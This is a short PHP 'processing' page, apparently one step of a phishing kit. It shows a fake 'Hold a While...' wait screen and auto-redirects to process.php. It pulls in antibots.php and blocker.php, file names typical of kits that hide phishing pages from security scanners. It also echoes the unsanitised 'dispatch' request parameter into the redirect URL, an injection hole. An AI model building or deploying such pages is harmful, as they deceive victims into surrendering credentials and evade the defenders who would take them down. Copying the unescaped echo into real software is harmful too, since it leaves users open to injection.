<?php
if (!isset($_SESSION)) {
  session_start();
}
 
include "./D/antibots.php";  
include "./D/blocker.php";

$rand = @$_GET['dispatch'];
?>
<html>
<head>
<title>Proccessing ....</title>
<link rel="stylesheet" type="text/css" href="./css/style.css" />
<link rel="shortcut icon" type="image/x-icon" href="images/favicon.png" />
<meta http-equiv="refresh" content="2; url=./process.php?dispatch=<?php echo $rand;?>" />
</head>
<body>
<div id="hold">
</div>
<div id="texttbi">
<h2 >Hold a While... </h2>
</div>
</body>
</html>